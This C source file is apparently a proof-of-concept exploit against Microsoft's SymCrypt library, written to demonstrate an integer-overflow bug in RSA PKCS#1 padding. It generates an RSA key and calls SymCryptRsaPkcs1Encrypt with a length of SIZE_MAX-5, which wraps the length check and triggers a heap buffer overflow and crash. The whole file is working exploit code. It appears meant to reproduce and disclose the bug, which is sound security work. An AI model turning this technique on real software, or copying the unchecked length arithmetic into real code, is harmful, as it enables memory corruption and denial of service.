/*
 * SymcryOverrun — real-code PoC against microsoft/SymCrypt (HEAD 286762b).
 *
 * Calls the public SymCryptRsaPkcs1Encrypt with cbSrc = SIZE_MAX-5. The length
 * guard in SymCryptRsaPkcs1ApplyEncryptionPadding (lib/rsa_padding.c:197)
 * computes (cbPlaintext + 11) in SIZE_T, which wraps to 5, so the check passes;
 * cbPS underflows to 259 and the padding code writes past the modulus-sized
 * heap buffer, then runs a ~2^64-byte memcpy. On a real build this crashes the
 * process. Compile with -fsanitize=address for the precise ASan report.
 */
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "symcrypt.h"

/* Invoke the generic environment (generates SymCryptInit + InjectError
 * forwarding; required for static-library linkage). */
SYMCRYPT_ENVIRONMENT_GENERIC

/* Override the weak SymCryptCallbackRandom: deterministic xorshift PRNG
 * (varying bytes so keygen's prime search terminates, but reproducible). */
SYMCRYPT_ERROR
SYMCRYPT_CALL
SymCryptCallbackRandom(PBYTE pbBuffer, SIZE_T cbBuffer)
{
    static UINT64 state = 0x1234567890ABCDEFULL;
    for (SIZE_T i = 0; i < cbBuffer; i++)
    {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        pbBuffer[i] = (BYTE)(state & 0xFF);
    }
    return SYMCRYPT_NO_ERROR;
}

/* Weak callbacks for allocation (malloc/free-based, like the reference
 * user-mode environment). */
PVOID
SYMCRYPT_CALL
SymCryptCallbackAlloc(SIZE_T nBytes)
{
    return malloc(nBytes);
}

VOID
SYMCRYPT_CALL
SymCryptCallbackFree(PVOID pMem)
{
    free(pMem);
}

int main(void)
{
    SYMCRYPT_ERROR scError;

    SymCryptInit();

    SYMCRYPT_RSA_PARAMS params;
    params.version = 1;
    params.nBitsOfModulus = 2048;
    params.nPrimes = 2;
    params.nPubExp = 1;

    PSYMCRYPT_RSAKEY pKey = SymCryptRsakeyAllocate(&params, 0);
    if (pKey == NULL)
    {
        printf("key allocation failed\n");
        return 1;
    }

    scError = SymCryptRsakeyGenerate(
        pKey, NULL, 0,
        SYMCRYPT_FLAG_KEY_NO_FIPS |
            SYMCRYPT_FLAG_RSAKEY_ENCRYPT |
            SYMCRYPT_FLAG_RSAKEY_SIGN);
    if (scError != SYMCRYPT_NO_ERROR)
    {
        printf("key generation failed: 0x%08x\n", scError);
        return 1;
    }
    printf("[+] 2048-bit RSA key generated\n");
    fflush(stdout);

    BYTE pbPlaintext[64];
    BYTE pbCiphertext[512];
    SIZE_T cbCiphertext = 0;
    memset(pbPlaintext, 0x41, sizeof(pbPlaintext));
    memset(pbCiphertext, 0, sizeof(pbCiphertext));

    /* the pathological length: (SIZE_MAX-5) + 11 wraps to 5 (mod 2^64) */
    SIZE_T cbSrc = SIZE_MAX - 5;
    printf("[!] calling SymCryptRsaPkcs1Encrypt(key, plaintext, cbSrc=0x%llx, ...)\n",
           (unsigned long long)cbSrc);
    fflush(stdout);

    scError = SymCryptRsaPkcs1Encrypt(
        pKey, pbPlaintext, cbSrc, 0,
        SYMCRYPT_NUMBER_FORMAT_MSB_FIRST,
        pbCiphertext, sizeof(pbCiphertext), &cbCiphertext);

    printf("encrypt returned 0x%08x (unexpected: should have crashed)\n", scError);
    fflush(stdout);
    return 0;
}
